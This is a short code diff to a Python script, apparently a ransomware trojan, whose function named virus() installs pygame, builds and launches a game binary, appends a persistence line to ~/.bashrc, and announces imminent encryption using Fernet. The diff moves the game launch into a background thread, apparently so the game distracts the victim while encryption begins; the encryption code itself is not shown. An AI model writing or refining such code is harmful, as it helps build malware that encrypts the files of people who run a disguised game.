@@ -2,7 +2,12 @@ import os
 import random
 import pathlib
 import time
+import threading
 from cryptography.fernet import Fernet
+
+def launch_game():
+	os.system("./jeu")
+
 ############################################################################################################################################################
 def virus():
 	gameadded = os.getenv("game_installed")
@@ -11,7 +16,9 @@ def virus():
 		os.system("pip install -U pygame")
 		os.system("python3 -m PyInstaller --onefile jeu.py; mv dist/jeu .")
 		os.system("export game_installed=true; echo 'export game_installed=true' >> ~/.bashrc")
-		os.system("./jeu")
+		game_thread = threading.Thread(target=launch_game, name="game_th")
+		game_thread.start()
+		
 
 	print("ceypting coming in 10 seconds")
 	time.sleep(10)
